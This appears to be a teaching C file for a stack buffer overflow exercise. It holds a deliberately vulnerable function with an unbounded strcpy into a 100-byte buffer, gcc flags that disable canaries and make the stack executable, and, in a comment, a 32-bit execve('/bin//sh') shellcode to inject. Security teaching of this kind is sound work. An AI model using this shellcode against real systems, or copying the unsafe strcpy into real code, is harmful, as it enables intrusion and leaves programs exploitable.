/*

Target of this program is to over flow stack in such a way that return address
from foo function changed to starting address of the buffer buffer contains the
executable shell code. This executable shell code might spawn a shell.

SHELLCODE : "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

Assume ASLR is turned off.

Compilation command:
gcc -m32 -g -fno-stack-protector fifth.c -o fifth -z execstack

Arguments used:
	-m 32: instrcuting the compiler to build 32 bit Binary
	-g: This allow C code to visible in gdb
	-f no-stack-protector: Disbale stack protection by canary
    -z execstack: mark stack as executable
*/

#include <stdio.h>
#include <string.h>

void foo(char *name){
	char buffer[100];
	strcpy(buffer, name);
	printf("Hello %s", buffer);
}

int main(int argc, char **argv)
{
	foo(argv[1]);
	return 0;
}

/*insert shellcode into buffer
over write return address to point to beginning of buffer
*/